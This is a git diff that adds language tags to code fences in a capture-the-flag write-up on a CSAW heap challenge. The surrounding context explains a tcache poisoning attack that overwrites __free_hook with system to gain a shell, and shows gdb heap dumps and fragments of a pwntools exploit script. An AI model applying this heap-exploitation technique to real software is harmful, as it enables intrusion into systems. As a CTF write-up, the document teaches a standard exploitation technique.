@@ -6,7 +6,7 @@ For this writeup, I'm assuming you've solved the first popping caps. These two a
 
 Taking a look at the main function, we see a lot of similarities:
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -71,7 +71,7 @@ undefined8 main(void)
 
 So some differences we noticed from the first problem, we can scan in `0xff` bytes instead of `0x8` bytes. Also we notice that the `bye` function doesn't have the `malloc` call in it:
 
-```
+```c
 void bye(void)
 
 {
@@ -86,7 +86,7 @@ So we have to do this without a malloc at the end. Our previous attack won't wor
 
 For this, we will essentially be freeing the chunk which holds the tcache linked list information, reallocating it, and writing to it. First we call malloc to setup the heap:
 
-```
+```gdb
 gef➤  x/100g 0x0000556921223000
 0x556921223000:    0x0    0x251
 0x556921223010:    0x0    0x0
@@ -142,7 +142,7 @@ gef➤  x/100g 0x0000556921223000
 
 Proceeding that, we will free the tcache idx block:
 
-```
+```gdb
 gef➤  x/100g 0x0000556921223000
 0x556921223000:    0x0    0x251
 0x556921223010:    0x0    0x0
@@ -197,7 +197,7 @@ gef➤  x/100g 0x0000556921223000
 ```
 
 As you can see, that chunk is in the tcache. Next we will allocate it:
-```
+```gdb
 gef➤  x/100g 0x0000556921223000
 0x556921223000:    0x0    0x251
 0x556921223010:    0x0    0x0
@@ -253,7 +253,7 @@ gef➤  x/100g 0x0000556921223000
 
 Now `ptrCopy` is set equal to `0x556921223010`. We will write to the tcache idx block. We will write to the beginning of the first idx, the libc address of `free` (which we know from the earlier infoleak), and also set the idx count to `0x1`. Also one thing I did here is I put `/bin/sh\x00` at `0x556921223050`, however that ended up not being needed:
 
-```
+```gdb
 gef➤  x/100g 0x0000556921223000
 0x556921223000:    0x0    0x251
 0x556921223010:    0x1    0x0
@@ -310,7 +310,7 @@ gef➤  x/g 0x7f9c2755b8e8
 ```
 
 Proceeding that we will allocate the chunk to the free hook:
-```
+```gdb
 gef➤  x/100g 0x0000556921223000
 0x556921223000:    0x0    0x251
 0x556921223010:    0x0    0x0
@@ -365,7 +365,7 @@ gef➤  x/100g 0x0000556921223000
 ```
 
 Now that `ptrCopy` is set to the free hook, we will write to it the address of `system`. I originally tried using a onegadget, however they didn't work for me in this case:
-```
+```gdb
 gef➤  x/g 0x7f9c2755b8e8
 0x7f9c2755b8e8 <__free_hook>:    0x7f9c271bd440
 gef➤  x/g 0x7f9c271bd440
@@ -378,7 +378,7 @@ Now `ptr` is set to the free hook at `0x7f9c2755b8e8`, in the libc. Next we will
 
 Putting it all together, we have the following exploit:
 
-```
+```python
 from pwn import *
 
 #target = remote("pwn.chal.csaw.io", 1008)
@@ -440,7 +440,7 @@ target.interactive()
 ```
 
 When we run it:
-```
+```console
 $    python roland.py
 [+] Starting local process './popping_caps': pid 3993
 [*] '/home/guyinatuxedo/Desktop/roland/popping_caps'
